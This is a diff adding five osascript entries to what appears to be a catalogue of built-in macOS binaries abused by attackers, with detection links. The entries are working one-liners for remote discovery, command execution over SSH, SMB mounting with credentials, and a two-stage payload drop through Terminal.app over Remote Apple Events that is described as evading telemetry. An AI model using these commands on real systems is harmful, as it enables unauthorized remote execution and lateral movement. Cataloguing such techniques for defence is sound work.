@@ -42,6 +42,61 @@ example_use_cases:
     tags:
       - jxa
       - osascript
+  - name: Remote host discovery over SSH using osascript system info
+    description: osascript can be invoked over SSH to run the AppleScript 'system info' command on a remote host. This returns a structured dictionary of host details including macOS version, active username, CPU architecture, memory, and network configuration without dropping any files or tooling on the target. This shifts the transport from Apple's eppc:// protocol to SSH while retaining the full capabilities of the AppleScript runtime.
+    code: "ssh -i key.pem user@<TARGET_IP> 'osascript -e \"system info\"'"
+    tactics:
+      - Discovery
+      - Lateral Movement
+    tags:
+      - osascript
+      - ssh
+      - discovery
+      - oneliner
+  - name: Remote command execution over SSH using osascript do shell script
+    description: osascript's 'do shell script' handler can be invoked over SSH to execute arbitrary shell commands on a remote host. This provides access to the broader AppleScript ecosystem including GUI automation and application scripting while using SSH as the transport, bypassing the dependency on Remote Apple Events being enabled on the target.
+    code: "ssh -i key.pem user@<TARGET_IP> 'bash -s' <<'EOF'\nosascript -e 'do shell script \"id\"'\nEOF"
+    tactics:
+      - Lateral Movement
+      - Execution
+    tags:
+      - osascript
+      - ssh
+      - remote-execution
+  - name: Mount SMB volume without GUI using osascript mount volume
+    description: osascript can mount an SMB share on the local machine using the 'mount volume' command. This approach bypasses the macOS GUI requirement for enabling Windows File Sharing password storage on the target, which is required when using the mount command directly. The share is mounted to /Volumes/<sharename> and its contents are immediately accessible as local files.
+    code: "osascript -e 'mount volume \"smb://user:<PASSWORD>@<TARGET_IP>/share\"'"
+    tactics:
+      - Lateral Movement
+    tags:
+      - osascript
+      - smb
+      - file-transfer
+      - oneliner
+  - name: Remote payload deployment via Terminal.app as a Remote Apple Events proxy
+    description: The System Events application blocks remote do shell script execution via Remote Apple Events (RAE), returning a -10016 Handler Error. Terminal.app does not have this restriction and accepts remote do script commands over the eppc:// protocol. This makes Terminal.app an effective execution proxy. Payloads are Base64-encoded before transmission to avoid AppleScript parsing errors (-2741) caused by multi-line scripts. The deployment is a two-stage process - the first RAE command decodes the payload to a temporary path and sets execute permissions, and the second invokes it via bash.
+    code: "osascript <<EOF\ntell application \"Terminal\" of machine \"eppc://${VICTIM_USER}:${VICTIM_PASS}@${VICTIM_IP}\"\n    do script \"echo \\\"${PAYLOAD_B64}\\\" | base64 --decode > ${REMOTE_SCRIPT_PATH} && chmod +x ${REMOTE_SCRIPT_PATH}\" in window 1\nend tell\nEOF\n\nosascript <<EOF\ntell application \"Terminal\" of machine \"eppc://${VICTIM_USER}:${VICTIM_PASS}@${VICTIM_IP}\"\n    do script \"bash ${REMOTE_SCRIPT_PATH}\" in window 1\nend tell\nEOF"
+    tactics:
+      - Execution
+      - Lateral Movement
+    tags:
+      - osascript
+      - rae
+      - eppc
+      - remote-apple-events
+  - name: Remote volume enumeration via Finder over Remote Apple Events
+    description: The Finder application is scriptable over Remote Apple Events (RAE) via the eppc:// URI scheme. osascript can address a remote Finder instance to query mounted volumes on the target machine, providing an adversary with immediate insight into available network shares and external storage. These actions are performed via Apple Events IPC rather than shell commands, bypassing security telemetry focused on process execution.
+    code: "osascript -e 'tell application \"Finder\" of machine \"eppc://user:password@<TARGET_IP>\" to get name of every disk'"
+    tactics:
+      - Discovery
+      - Lateral Movement
+    tags:
+      - osascript
+      - rae
+      - eppc
+      - remote-apple-events
+      - finder
+      - oneliner
 paths:
   - /usr/bin/osascript
 detections:
@@ -54,5 +109,8 @@ detections:
   - name: "Jamf Protect: Detect activity that is related to generating dialogs using osascript and asking for specific user input"
     url: https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_dialog_activity
 resources:
-  - name: 'Using macOS Internals for Post Exploitation'  
+  - name: 'Using macOS Internals for Post Exploitation'
     url: https://medium.com/red-teaming-with-a-blue-team-mentality/using-macos-internals-for-post-exploitation-b5faaa11e121
+acknowledgements:
+  - Billy Gibson (Remote Apple Events use cases)
+  - Ryan Conry (SSH execution, SMB mount, and Finder comment use cases)
